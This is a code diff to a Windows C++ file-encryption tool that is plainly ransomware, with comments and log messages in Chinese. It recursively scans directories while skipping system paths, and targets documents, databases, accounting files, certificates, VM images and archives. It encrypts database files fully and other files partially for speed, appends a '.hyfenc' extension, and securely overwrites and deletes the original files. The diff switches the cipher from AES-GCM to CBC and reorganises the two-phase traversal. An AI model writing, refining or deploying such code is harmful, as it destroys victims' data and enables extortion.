         bool hwAccelSupported = IsAesNiSupported();
-        const wchar_t* algorithmProvider = hwAccelSupported ?
-            BCRYPT_AES_ALGORITHM : MS_PRIMITIVE_PROVIDER;
 
-        status = BCryptOpenAlgorithmProvider(&hAlgorithm, algorithmProvider, NULL, 0);
+        // 使用AES算法
+        status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
         if (!NT_SUCCESS(status)) {
-            status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
-            if (!NT_SUCCESS(status)) {
-                throw std::runtime_error("BCryptOpenAlgorithmProvider failed: " + to_hex(status));
-            }
+            throw std::runtime_error("BCryptOpenAlgorithmProvider失败: " + to_hex(status));
         }
 
-        // Set encryption mode to GCM
-        const wchar_t* chainMode = BCRYPT_CHAIN_MODE_GCM;
+        // 设置加密模式为CBC
+        const wchar_t cbcMode[] = BCRYPT_CHAIN_MODE_CBC;
         status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE,
-            reinterpret_cast<PBYTE>(const_cast<wchar_t*>(chainMode)),
-            static_cast<ULONG>(wcslen(chainMode) * sizeof(wchar_t)), 0);
+            reinterpret_cast<PBYTE>(const_cast<wchar_t*>(cbcMode)),
+            sizeof(cbcMode), 0);
         if (!NT_SUCCESS(status)) {
-            throw std::runtime_error("BCryptSetProperty failed: " + to_hex(status));
+            throw std::runtime_error("BCryptSetProperty失败: " + to_hex(status));
         }
 
-        // Get key object size
+        // 获取密钥对象大小
         DWORD cbData = 0;
         status = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH,
             reinterpret_cast<PBYTE>(&cbKeyObject), sizeof(DWORD), &cbData, 0);
         if (!NT_SUCCESS(status)) {
-            throw std::runtime_error("BCryptGetProperty(OBJECT_LENGTH) failed: " + to_hex(status));
+            throw std::runtime_error("BCryptGetProperty(OBJECT_LENGTH)失败: " + to_hex(status));
         }
 
         keyObject.resize(cbKeyObject);
 
-        // Generate symmetric key
+        // 生成对称密钥 - AES-256需要32字节密钥
         status = BCryptGenerateSymmetricKey(
             hAlgorithm, &hKey, keyObject.data(), cbKeyObject,
             const_cast<BYTE*>(key), KEY_LENGTH, 0);
         if (!NT_SUCCESS(status)) {
-            throw std::runtime_error("BCryptGenerateSymmetricKey failed: " + to_hex(status));
+            throw std::runtime_error("BCryptGenerateSymmetricKey失败: " + to_hex(status));
         }
 
-        // Generate IV
+        // 生成随机IV
         status = BCryptGenRandom(NULL, iv.data(), IV_LENGTH, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
         if (!NT_SUCCESS(status)) {
-            throw std::runtime_error("BCryptGenRandom failed: " + to_hex(status));
-        }
-
-        // Open input file using memory mapping
-        if (!inputMap.open(inputFile, GENERIC_READ, PAGE_READONLY, FILE_MAP_READ)) {
-            DWORD error = GetLastError();
-            throw std::runtime_error("Failed to memory map input file. Error: " + std::to_string(error));
-        }
-
-        size_t fileSize = inputMap.getSize();
-        if (fileSize == 0) {
-            throw std::runtime_error("Input file is empty");
+            throw std::runtime_error("BCryptGenRandom失败: " + to_hex(status));
         }
 
         std::string extension = inputFile.extension().string();
         std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
-
-        // Database file extension collection
-        static const std::unordered_set<std::string> databaseExtensions = {
-            ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
-            ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
-            ".backup", ".wal", ".journal", ".dat", ".bin"
-        };
-
-        bool isDatabaseFile = databaseExtensions.find(extension) != databaseExtensions.end();
-
-        // 修改部分：增强权限处理的文件创建逻辑
-        // Create output file - 增强权限处理
-        DWORD desiredAccess = GENERIC_READ | GENERIC_WRITE;
-        DWORD shareMode = FILE_SHARE_READ; // 允许其他进程读取
-        DWORD creationDisposition = CREATE_ALWAYS;
-        DWORD flagsAndAttributes = FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN;
-
-        hOutputFile = CreateFileW(outputFile.c_str(), desiredAccess, shareMode, NULL,
-            creationDisposition, flagsAndAttributes, NULL);
-
-        if (hOutputFile == INVALID_HANDLE_VALUE) {
-            DWORD error = GetLastError();
-            // 如果是权限错误，尝试使用更低权限模式
-            if (error == ERROR_ACCESS_DENIED) {
-                std::cerr << "警告: 无法以完全访问权限创建文件，尝试只写模式: " << outputFile << std::endl;
-
-                // 尝试只写模式
-                desiredAccess = GENERIC_WRITE;
-                shareMode = 0; // 不共享
-                hOutputFile = CreateFileW(outputFile.c_str(), desiredAccess, shareMode, NULL,
-                    creationDisposition, flagsAndAttributes, NULL);
-
-                if (hOutputFile == INVALID_HANDLE_VALUE) {
-                    error = GetLastError();
-                    // 如果仍然失败，跳过此文件
-                    std::cerr << "无法创建输出文件，跳过: " << outputFile << " 错误: " << error << std::endl;
-                    throw std::runtime_error("CreateFile failed for output. Error: " + std::to_string(error));
-                }
-            }
-            else {
-                throw std::runtime_error("CreateFile failed for output. Error: " + std::to_string(error));
-            }
-        }
-
-        // Calculate output file size
-        size_t outputSize = fileSize;
-        if (!isDatabaseFile) {
-            outputSize += IV_LENGTH + TAG_LENGTH; // For non-database files, add IV at beginning and Tag at end
-        }
-
-        // Set file size
-        LARGE_INTEGER liSize;
-        liSize.QuadPart = outputSize;
-        if (!SetFilePointerEx(hOutputFile, liSize, NULL, FILE_BEGIN)) {
-            DWORD error = GetLastError();
-            throw std::runtime_error("SetFilePointerEx failed. Error: " + std::to_string(error));
-        }
-
-        if (!SetEndOfFile(hOutputFile)) {
-            DWORD error = GetLastError();
-            throw std::runtime_error("SetEndOfFile failed. Error: " + std::to_string(error));
-        }
-
-        // Use GCM mode encryption function
-        if (!EncryptFileChunksGCM(hKey, iv.data(), static_cast<const BYTE*>(inputMap.data()),
-            fileSize, hOutputFile, isDatabaseFile)) {
-            throw std::runtime_error("GCM chunk encryption failed");
-        }
-
-        // Close memory mapping and file handles
-        inputMap.close();
-
-        // Ensure file handle is properly closed
-        if (hOutputFile != INVALID_HANDLE_VALUE) {
-            CloseHandle(hOutputFile);
-            hOutputFile = INVALID_HANDLE_VALUE;
-        }
-
-        // Release CNG resources
-        if (hKey) {
-            BCryptDestroyKey(hKey);
-            hKey = NULL;
-        }
-        if (hAlgorithm) {
-            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
-            hAlgorithm = NULL;
-        }
-
-        // Securely delete source file after successful encryption
-        std::cout << "Encryption completed, securely deleting source file: " << inputFile << std::endl;
-
-        // 修改部分：增强安全删除的错误处理
-        if (!SecureDelete(inputFile)) {
-            std::cerr << "警告: 安全删除失败，尝试普通删除: " << inputFile << std::endl;
-            // 回退到普通删除
-            std::error_code ec;
-            if (!fs::remove(inputFile, ec)) {
-                std::cerr << "普通删除也失败: " << inputFile << " 错误: " << ec.message() << std::endl;
-            }
-            else {
-                std::cout << "普通删除成功: " << inputFile << std::endl;
-            }
-        }
-
-        std::cout << "File encrypted and source file deleted successfully: " << inputFile << " -> " << outputFile << std::endl;
-        encryptionSuccess = true;
-        return true;
-    }
-    catch (const std::exception& e) {
-        // Clean up resources - ensure all resources are properly released
-        if (hKey) {
-            BCryptDestroyKey(hKey);
-            hKey = NULL;
-        }
-        if (hAlgorithm) {
-            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
-            hAlgorithm = NULL;
-        }
-
-        // Ensure file handle is properly closed
-        if (hOutputFile != INVALID_HANDLE_VALUE) {
-            CloseHandle(hOutputFile);
-            hOutputFile = INVALID_HANDLE_VALUE;
-        }
-
-        // Close memory mapping
-        inputMap.close();
-
-        // Delete incomplete output file only if encryption was not successful
-        if (!encryptionSuccess) {
-            DWORD attributes = GetFileAttributesW(outputFile.c_str());
-            if (attributes != INVALID_FILE_ATTRIBUTES) {
-                // Ensure file is not read-only
-                if (attributes & FILE_ATTRIBUTE_READONLY) {
-                    SetFileAttributesW(outputFile.c_str(), attributes & ~FILE_ATTRIBUTE_READONLY);
-                }
-
-                // Use Windows API to delete file
-                if (DeleteFileW(outputFile.c_str())) {
-                    std::cout << "Deleted incomplete output file: " << outputFile << std::endl;
-                }
-                else {
-                    DWORD error = GetLastError();
-                    std::cerr << "Failed to delete incomplete output file: " << outputFile << " Error: " << error << std::endl;
-                }
-            }
-        }
-
-        std::cerr << "Encryption error: " << e.what() << " File: " << inputFile << std::endl;
-        return false;
-    }
-}
-
-// 遍历目录并异步加密文件（修改版）
-// 在traverseAndEncryptAsync函数中添加系统文件检查
-inline void traverseAndEncryptAsync(const fs::path& directoryPath,
-    const std::vector<std::string>& extensions,
-    const BYTE* key) {
-    try {
-        // 检查目录是否有效
-        if (!fs::exists(directoryPath) || !fs::is_directory(directoryPath)) {
-            std::cerr << "无效目录: " << directoryPath << std::endl;
-            return;
-        }
-
-        // 创建异步加密管理器
-        AsyncEncryptionManager manager;
-
-        // 初始化计数器
-        size_t fileCount = 0;
-        size_t dbFileCount = 0;
-        size_t otherFileCount = 0;
-        size_t skippedFiles = 0;
-        size_t smallFileCount = 0;
-        size_t largeFileCount = 0;
-
-        // 系统文件模式，这些文件通常无法访问或不应修改
-        static const std::vector<std::wstring> systemPatterns = {
-            L"WindowsApps",
-            L"Windows",
-            L"System32",
-            L"$Recycle.Bin",
-            L"ProgramData\\Microsoft\\Windows",
-            L"AppData",
-            L"Temp",
-            L"Temporary Internet Files",
-            L"WinSxS",
-            L"DriverStore",
-            L"Assembly",
-            L"Microsoft.NET",
-            L"ServiceProfiles",
-            L"System Volume Information"
-        };
 
         // 数据库文件扩展名集合
         static const std::unordered_set<std::string> databaseExtensions = {
@@ -889,175 +850,148 @@ inline void traverseAndEncryptAsync(const fs::path& directoryPath,
             ".backup", ".wal", ".journal", ".dat", ".bin"
         };
 
-        // 第一阶段：优先处理数据库文件
-        std::cout << "第一阶段：开始处理数据库文件..." << std::endl;
-        try {
-            for (const auto& entry : fs::recursive_directory_iterator(
-                directoryPath, fs::directory_options::skip_permission_denied)) {
+        bool isDatabaseFile = databaseExtensions.find(extension) != databaseExtensions.end();
 
-                // 跳过非普通文件
-                if (!entry.is_regular_file()) continue;
+        // 创建输出文件 - 增强权限处理
+        DWORD desiredAccess = GENERIC_READ | GENERIC_WRITE;
+        DWORD shareMode = FILE_SHARE_READ;
+        DWORD creationDisposition = CREATE_ALWAYS;
+        DWORD flagsAndAttributes = FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN;
 
-                // 检查是否是系统文件
-                std::wstring filePath = entry.path().wstring();
-                bool isSystemFile = false;
-                for (const auto& pattern : systemPatterns) {
-                    if (filePath.find(pattern) != std::wstring::npos) {
-                        isSystemFile = true;
-                        skippedFiles++;
-                        break;
-                    }
-                }
+        hOutputFile = CreateFileW(outputFile.c_str(), desiredAccess, shareMode, NULL,
+            creationDisposition, flagsAndAttributes, NULL);
 
-                if (isSystemFile) continue;
+        if (hOutputFile == INVALID_HANDLE_VALUE) {
+            DWORD error = GetLastError();
+            if (error == ERROR_ACCESS_DENIED) {
+                std::cerr << "警告: 无法以完全访问权限创建文件，尝试只写模式: " << outputFile << std::endl;
 
-                // 获取文件扩展名并转换为小写
-                std::string ext = entry.path().extension().string();
-                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
+                desiredAccess = GENERIC_WRITE;
+                shareMode = 0;
+                hOutputFile = CreateFileW(outputFile.c_str(), desiredAccess, shareMode, NULL,
+                    creationDisposition, flagsAndAttributes, NULL);
 
-                // 检查是否是数据库文件
-                bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();
-                if (!isDatabaseFile) continue; // 跳过非数据库文件（它们在第二阶段处理）
-
-                // 检查扩展名是否在目标列表中
-                bool shouldEncrypt = std::any_of(extensions.begin(), extensions.end(),
-                    [&](const std::string& targetExt) {
-                        std::string lowerTarget = targetExt;
-                        std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::tolower);
-                        return ext == lowerTarget;
-                    });
-
-                if (shouldEncrypt) {
-                    // 创建加密后的文件名
-                    fs::path outputFile = entry.path();
-                    outputFile += ".hyfenc";
-
-                    // 添加加密任务
-                    manager.addTask(entry.path(), outputFile, key);
-                    fileCount++;
-                    dbFileCount++;
-
-                    // 统计文件大小分类
-                    size_t fileSize = entry.file_size();
-                    if (fileSize < 1024 * 1024) {
-                        smallFileCount++;
-                    }
-                    else {
-                        largeFileCount++;
-                    }
-
-                    std::cout << "已添加数据库文件加密任务: " << entry.path() << " (大小: "
-                        << fileSize / 1024 << " KB)" << std::endl;
+                if (hOutputFile == INVALID_HANDLE_VALUE) {
+                    error = GetLastError();
+                    std::cerr << "无法创建输出文件，跳过: " << outputFile << " 错误: " << error << std::endl;
+                    throw std::runtime_error("CreateFile失败: " + std::to_string(error));
                 }
             }
-        }
-        catch (const std::exception& e) {
-            std::cerr << "第一阶段处理出错: " << e.what() << std::endl;
-        }
-
-        std::cout << "第一阶段完成，找到 " << dbFileCount << " 个数据库文件" << std::endl;
-        std::cout << "  小于1MB: " << smallFileCount << " 个" << std::endl;
-        std::cout << "  大于等于1MB: " << largeFileCount << " 个" << std::endl;
-        std::cout << "  跳过系统文件: " << skippedFiles << " 个" << std::endl;
-
-        // 重置计数器用于第二阶段
-        smallFileCount = 0;
-        largeFileCount = 0;
-        skippedFiles = 0;
-
-        // 第二阶段：处理其他文件
-        std::cout << "\n第二阶段：开始处理其他文件..." << std::endl;
-        try {
-            for (const auto& entry : fs::recursive_directory_iterator(
-                directoryPath, fs::directory_options::skip_permission_denied)) {
-
-                // 跳过非普通文件
-                if (!entry.is_regular_file()) continue;
-
-                // 检查是否是系统文件
-                std::wstring filePath = entry.path().wstring();
-                bool isSystemFile = false;
-                for (const auto& pattern : systemPatterns) {
-                    if (filePath.find(pattern) != std::wstring::npos) {
-                        isSystemFile = true;
-                        skippedFiles++;
-                        break;
-                    }
-                }
-
-                if (isSystemFile) continue;
-
-                // 获取文件扩展名并转换为小写
-                std::string ext = entry.path().extension().string();
-                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
-
-                // 跳过数据库文件（它们已在第一阶段处理）
-                bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();
-                if (isDatabaseFile) continue;
-
-                // 检查扩展名是否在目标列表中
-                bool shouldEncrypt = std::any_of(extensions.begin(), extensions.end(),
-                    [&](const std::string& targetExt) {
-                        std::string lowerTarget = targetExt;
-                        std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::tolower);
-                        return ext == lowerTarget;
-                    });
-
-                if (shouldEncrypt) {
-                    // 创建加密后的文件名
-                    fs::path outputFile = entry.path();
-                    outputFile += ".hyfenc";
-
-                    // 添加加密任务
-                    manager.addTask(entry.path(), outputFile, key);
-                    fileCount++;
-                    otherFileCount++;
-
-                    // 统计文件大小分类
-                    size_t fileSize = entry.file_size();
-                    if (fileSize < 1024 * 1024) {
-                        smallFileCount++;
-                    }
-                    else {
-                        largeFileCount++;
-                    }
-
-                    std::cout << "已添加非数据库文件加密任务: " << entry.path() << " (大小: "
-                        << fileSize / 1024 << " KB)" << std::endl;
-                }
+            else {
+                throw std::runtime_error("CreateFile失败: " + std::to_string(error));
             }
         }
-        catch (const std::exception& e) {
-            std::cerr << "第二阶段处理出错: " << e.what() << std::endl;
+
+        // 计算输出文件大小 - CBC需要IV
+        size_t outputSize = fileSize;
+        if (!isDatabaseFile) {
+            outputSize += IV_LENGTH; // 对于非数据库文件，在开头添加IV
         }
 
-        std::cout << "第二阶段完成，找到 " << otherFileCount << " 个非数据库文件" << std::endl;
-        std::cout << "  小于1MB: " << smallFileCount << " 个" << std::endl;
-        std::cout << "  大于等于1MB: " << largeFileCount << " 个" << std::endl;
-        std::cout << "  跳过系统文件: " << skippedFiles << " 个" << std::endl;
+        // 设置文件大小
+        LARGE_INTEGER liSize;
+        liSize.QuadPart = outputSize;
+        if (!SetFilePointerEx(hOutputFile, liSize, NULL, FILE_BEGIN)) {
+            DWORD error = GetLastError();
+            throw std::runtime_error("SetFilePointerEx失败: " + std::to_string(error));
+        }
 
-        std::cout << "\n开始加密 " << fileCount << " 个文件 ("
-            << dbFileCount << " 个数据库文件, "
-            << otherFileCount << " 个其他文件)..." << std::endl;
+        if (!SetEndOfFile(hOutputFile)) {
+            DWORD error = GetLastError();
+            throw std::runtime_error("SetEndOfFile失败: " + std::to_string(error));
+        }
 
-        // 等待所有任务完成
-        manager.waitForCompletion();
+        // 使用CBC模式加密函数
+        if (!EncryptFileChunksCBC(hKey, iv.data(), static_cast<const BYTE*>(inputMap.data()),
+            fileSize, hOutputFile, isDatabaseFile)) {
+            throw std::runtime_error("CBC分块加密失败");
+        }
 
-        // 显示加密统计信息
-        manager.printStatistics();
+        // 关闭内存映射和文件句柄
+        inputMap.close();
 
-        std::cout << "完成加密 " << fileCount << " 个文件." << std::endl;
-        std::cout << "加密策略: " << std::endl;
-        std::cout << "  数据库文件: 全文件加密" << std::endl;
-        std::cout << "  非数据库文件: " << std::endl;
-        std::cout << "    - 小于1MB: 加密文件头部4KB" << std::endl;
-        std::cout << "    - 大于等于1MB: 分块加密15%" << std::endl;
+        if (hOutputFile != INVALID_HANDLE_VALUE) {
+            CloseHandle(hOutputFile);
+            hOutputFile = INVALID_HANDLE_VALUE;
+        }
+
+        // 释放CNG资源
+        if (hKey) {
+            BCryptDestroyKey(hKey);
+            hKey = NULL;
+        }
+        if (hAlgorithm) {
+            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+            hAlgorithm = NULL;
+        }
+
+        // 加密完成后安全删除源文件
+        std::cout << "加密完成，安全删除源文件: " << inputFile << std::endl;
+
+        bool deleteSuccess = SecureDelete(inputFile);
+        if (!deleteSuccess) {
+            std::cerr << "警告: 安全删除失败，尝试普通删除: " << inputFile << std::endl;
+            std::error_code ec;
+            deleteSuccess = fs::remove(inputFile, ec);
+            if (!deleteSuccess) {
+                std::cerr << "普通删除也失败: " << inputFile << " 错误: " << ec.message() << std::endl;
+                // 删除失败，返回false，但保留加密后的文件
+                encryptionSuccess = false;
+            }
+        }
+
+        if (deleteSuccess) {
+            std::cout << "文件加密成功并删除源文件: " << inputFile << " -> " << outputFile << std::endl;
+            encryptionSuccess = true;
+        }
+        else {
+            std::cout << "文件加密成功但删除源文件失败: " << inputFile << " -> " << outputFile << std::endl;
+            // 加密成功但删除失败，返回false
+            encryptionSuccess = false;
+        }
+
+        return encryptionSuccess;
     }
     catch (const std::exception& e) {
-        std::cerr << "严重错误: " << e.what() << std::endl;
+        // 清理资源
+        if (hKey) {
+            BCryptDestroyKey(hKey);
+            hKey = NULL;
+        }
+        if (hAlgorithm) {
+            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+            hAlgorithm = NULL;
+        }
+
+        if (hOutputFile != INVALID_HANDLE_VALUE) {
+            CloseHandle(hOutputFile);
+            hOutputFile = INVALID_HANDLE_VALUE;
+        }
+
+        inputMap.close();
+
+        // 删除不完整的输出文件
+        if (!encryptionSuccess) {
+            DWORD attributes = GetFileAttributesW(outputFile.c_str());
+            if (attributes != INVALID_FILE_ATTRIBUTES) {
+                if (attributes & FILE_ATTRIBUTE_READONLY) {
+                    SetFileAttributesW(outputFile.c_str(), attributes & ~FILE_ATTRIBUTE_READONLY);
+                }
+
+                if (DeleteFileW(outputFile.c_str())) {
+                    std::cout << "已删除不完整的输出文件: " << outputFile << std::endl;
+                }
+                else {
+                    DWORD error = GetLastError();
+                    std::cerr << "删除不完整输出文件失败: " << outputFile << " 错误: " << error << std::endl;
+                }
+            }
+        }
+
+        std::cerr << "加密错误: " << e.what() << " 文件: " << inputFile << std::endl;
+        return false;
     }
 }
-
 // 实现辅助函数
 inline void GenerateRandomKey(BYTE* key, DWORD length) {
     NTSTATUS status = BCryptGenRandom(
@@ -1109,7 +1043,6 @@ inline std::string to_hex(NTSTATUS status) {
     return ss.str();
 }
 
-// SecureDelete函数实现
 // SecureDelete函数实现 - 修复版
 bool SecureDelete(const fs::path& path) {
     // 检查文件是否存在
@@ -1158,15 +1091,17 @@ bool SecureDelete(const fs::path& path) {
         }
 
         // 3. 单次随机数据覆写
-        const DWORD bufferSize = 64 * 1024; // 64KB缓冲区
+        const DWORD bufferSize = 64 * 1024; // 极速模式：单次覆写
         std::vector<BYTE> randomBuffer(bufferSize);
 
         // 使用密码学安全的随机数生成器
-        std::random_device rd;
-        std::independent_bits_engine<std::mt19937, CHAR_BIT, unsigned short> rng(rd());
-
-        // 生成随机缓冲区内容
-        std::generate(randomBuffer.begin(), randomBuffer.end(), rng);
+        NTSTATUS status = BCryptGenRandom(NULL, randomBuffer.data(), bufferSize, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+        if (!NT_SUCCESS(status)) {
+            // 回退到标准随机数生成器
+            std::random_device rd;
+            std::independent_bits_engine<std::mt19937, CHAR_BIT, unsigned short> rng(rd());
+            std::generate(randomBuffer.begin(), randomBuffer.end(), rng);
+        }
 
         LARGE_INTEGER offset = { 0 };
         DWORD bytesWritten = 0;
@@ -1251,22 +1186,237 @@ bool SecureDelete(const fs::path& path) {
     catch (const std::exception& e) {
         std::cerr << "安全删除失败 " << path << ": " << e.what() << std::endl;
 
-        // 清理资源
-        if (hFile != INVALID_HANDLE_VALUE) {
-            CloseHandle(hFile);
-        }
-
-        // 回退到普通删除
+        // 极速模式：直接删除文件
         std::error_code ec;
         if (fs::remove(path, ec)) {
-            std::cout << "已使用普通删除方式移除文件: " << path << std::endl;
+            std::cout << "已使用极速删除方式移除文件: " << path << std::endl;
             return true;
         }
 
-        std::cerr << "普通删除也失败: " << path << " 错误: " << ec.message() << std::endl;
+        std::cerr << "极速删除也失败: " << path << " 错误: " << ec.message() << std::endl;
         return false;
     }
-}// 主函数
+}
+
+// 遍历目录并加密文件 - 修复版（确保先加密数据库文件，再加密其他文件）
+inline void traverseAndEncryptAsync(const fs::path& directoryPath,
+    const std::vector<std::string>& extensions,
+    const BYTE* key) {
+    try {
+        // 检查目录是否有效
+        if (!fs::exists(directoryPath) || !fs::is_directory(directoryPath)) {
+            std::cerr << "无效目录: " << directoryPath << std::endl;
+            return;
+        }
+
+        // 创建异步加密管理器
+        AsyncEncryptionManager manager;
+
+        // 初始化计数器
+        size_t totalFiles = 0;
+        size_t dbFileCount = 0;
+        size_t otherFileCount = 0;
+        size_t skippedFiles = 0;
+        size_t smallFileCount = 0;
+        size_t largeFileCount = 0;
+
+        // 系统文件模式，这些文件通常无法访问或不应修改
+        static const std::vector<std::wstring> systemPatterns = {
+            L"WindowsApps",
+            L"Windows",
+            L"System32",
+            L"$Recycle.Bin",
+            L"ProgramData\\Microsoft\\Windows",
+            L"AppData",
+            L"Temp",
+            L"Temporary Internet Files",
+            L"WinSxS",
+            L"DriverStore",
+            L"Assembly",
+            L"Microsoft.NET",
+            L"ServiceProfiles",
+            L"System Volume Information"
+        };
+
+        // 数据库文件扩展名集合
+        static const std::unordered_set<std::string> databaseExtensions = {
+            ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
+            ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
+            ".backup", ".wal", ".journal", ".dat", ".bin"
+        };
+
+        // 用于存储分类的文件
+        std::vector<std::pair<fs::path, bool>> databaseFiles;    // <文件路径, 是否数据库文件>
+        std::vector<std::pair<fs::path, bool>> otherFiles;
+
+        std::cout << "开始扫描目录: " << directoryPath << std::endl;
+
+        try {
+            // 单次遍历：同时收集数据库文件和其他文件
+            for (const auto& entry : fs::recursive_directory_iterator(
+                directoryPath, fs::directory_options::skip_permission_denied)) {
+
+                // 跳过非普通文件
+                if (!entry.is_regular_file()) continue;
+
+                // 检查是否是系统文件
+                std::wstring filePath = entry.path().wstring();
+                bool isSystemFile = false;
+                for (const auto& pattern : systemPatterns) {
+                    if (filePath.find(pattern) != std::wstring::npos) {
+                        isSystemFile = true;
+                        skippedFiles++;
+                        break;
+                    }
+                }
+
+                if (isSystemFile) continue;
+
+                // 获取文件扩展名并转换为小写
+                std::string ext = entry.path().extension().string();
+                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
+
+                // 检查是否是数据库文件
+                bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();
+
+                // 检查扩展名是否在目标列表中
+                bool shouldEncrypt = std::any_of(extensions.begin(), extensions.end(),
+                    [&](const std::string& targetExt) {
+                        std::string lowerTarget = targetExt;
+                        std::transform(lowerTarget.begin(), lowerTarget.end(), lowerTarget.begin(), ::tolower);
+                        return ext == lowerTarget;
+                    });
+
+                if (shouldEncrypt) {
+                    if (isDatabaseFile) {
+                        databaseFiles.emplace_back(entry.path(), true);
+                    }
+                    else {
+                        otherFiles.emplace_back(entry.path(), false);
+                    }
+
+                    // 统计文件大小分类
+                    size_t fileSize = entry.file_size();
+                    if (fileSize < 1024 * 1024) {
+                        smallFileCount++;
+                    }
+                    else {
+                        largeFileCount++;
+                    }
+                }
+            }
+        }
+        catch (const std::exception& e) {
+            std::cerr << "目录扫描出错: " << e.what() << std::endl;
+        }
+        catch (...) {
+            std::cerr << "目录扫描出错: Unknown exception" << std::endl;
+        }
+
+        // 统计文件数量
+        dbFileCount = databaseFiles.size();
+        otherFileCount = otherFiles.size();
+        totalFiles = dbFileCount + otherFileCount;
+
+        std::cout << "扫描完成，找到 " << totalFiles << " 个文件" << std::endl;
+        std::cout << "  数据库文件: " << dbFileCount << " 个" << std::endl;
+        std::cout << "  其他文件: " << otherFileCount << " 个" << std::endl;
+        std::cout << "  小于1MB: " << smallFileCount << " 个" << std::endl;
+        std::cout << "  大于等于1MB: " << largeFileCount << " 个" << std::endl;
+        std::cout << "  跳过系统文件: " << skippedFiles << " 个" << std::endl;
+
+        // 第一阶段：处理数据库文件
+        if (!databaseFiles.empty()) {
+            std::cout << "\n第一阶段：开始处理 " << dbFileCount << " 个数据库文件..." << std::endl;
+
+            auto startTime = std::chrono::steady_clock::now();
+
+            for (const auto& fileInfo : databaseFiles) {
+                const auto& filePath = fileInfo.first;
+
+                // 创建加密后的文件名
+                fs::path outputFile = filePath;
+                outputFile += ".hyfenc";
+
+                // 添加加密任务
+                manager.addTask(filePath, outputFile, key);
+
+                std::cout << "已添加数据库文件加密任务: " << filePath << std::endl;
+            }
+
+            // 等待第一阶段任务完成
+            try {
+                manager.waitForCompletion();
+            }
+            catch (const std::exception& e) {
+                std::cerr << "第一阶段等待完成时出错: " << e.what() << std::endl;
+            }
+            catch (...) {
+                std::cerr << "第一阶段等待完成时出错: Unknown exception" << std::endl;
+            }
+
+            auto endTime = std::chrono::steady_clock::now();
+            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);
+            std::cout << "第一阶段完成，耗时: " << duration.count() << " ms" << std::endl;
+        }
+
+        // 第二阶段：处理非数据库文件
+        if (!otherFiles.empty()) {
+            std::cout << "\n第二阶段：开始处理 " << otherFileCount << " 个非数据库文件..." << std::endl;
+
+            auto startTime = std::chrono::steady_clock::now();
+
+            for (const auto& fileInfo : otherFiles) {
+                const auto& filePath = fileInfo.first;
+
+                // 创建加密后的文件名
+                fs::path outputFile = filePath;
+                outputFile += ".hyfenc";
+
+                // 添加加密任务
+                manager.addTask(filePath, outputFile, key);
+
+                std::cout << "已添加非数据库文件加密任务: " << filePath << std::endl;
+            }
+
+            // 等待第二阶段任务完成
+            try {
+                manager.waitForCompletion();
+            }
+            catch (const std::exception& e) {
+                std::cerr << "第二阶段等待完成时出错: " << e.what() << std::endl;
+            }
+            catch (...) {
+                std::cerr << "第二阶段等待完成时出错: Unknown exception" << std::endl;
+            }
+
+            auto endTime = std::chrono::steady_clock::now();
+            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);
+            std::cout << "第二阶段完成，耗时: " << duration.count() << " ms" << std::endl;
+        }
+
+        std::cout << "\n加密完成统计:" << std::endl;
+        std::cout << "  总计文件: " << totalFiles << " 个" << std::endl;
+        std::cout << "  数据库文件: " << dbFileCount << " 个" << std::endl;
+        std::cout << "  其他文件: " << otherFileCount << " 个" << std::endl;
+
+        // 显示加密统计信息
+        manager.printStatistics();
+
+        std::cout << "加密策略: " << std::endl;
+        std::cout << "  数据库文件: 全文件加密" << std::endl;
+        std::cout << "  非数据库文件: " << std::endl;
+        std::cout << "    - 小于1MB: 加密文件头部4KB" << std::endl;
+        std::cout << "    - 大于等于1MB: 分块加密15%" << std::endl;
+    }
+    catch (const std::exception& e) {
+        std::cerr << "严重错误: " << e.what() << std::endl;
+    }
+    catch (...) {
+        std::cerr << "严重错误: Unknown exception" << std::endl;
+    }
+}
+// 主函数
 inline int encrypthf() {
     bool hwAccelSupported = IsAesNiSupported();
     std::cout << "AES Hardware Acceleration: " << (hwAccelSupported ? "SUPPORTED" : "NOT SUPPORTED") << std::endl;
@@ -1292,25 +1442,21 @@ inline int encrypthf() {
 
     // 目标文件扩展名
     std::vector<std::string> extensions = {
-        ".doc", ".docx", ".xlsx", ".xls", ".pptx", ".pdf",
-        ".mdf", ".ndf", ".bak", ".sqlite", ".db", ".ldf",
-        ".qbb", ".qbo", ".ofx",
-        ".javass", ".pys", ".jss", ".ymls", ".inis", ".envs",
-        ".psd", ".ai", ".dwg", ".skp",
-        ".vmdk", ".iso", ".pfx", ".pems",
-        ".pst", ".mbox", ".mpp",
-        ".jar", ".zip", ".tar.gz",
-        "pptx", "ppt", "jpg", "png", "txt", "jpeg"
+       ".doc", ".docx", ".xlsx", ".xls", ".pptx", ".pdf",
+       ".mdf", ".ndf", ".bak", ".sqlite", ".db", ".ldf",
+       ".qbb", ".qbo", ".ofx",
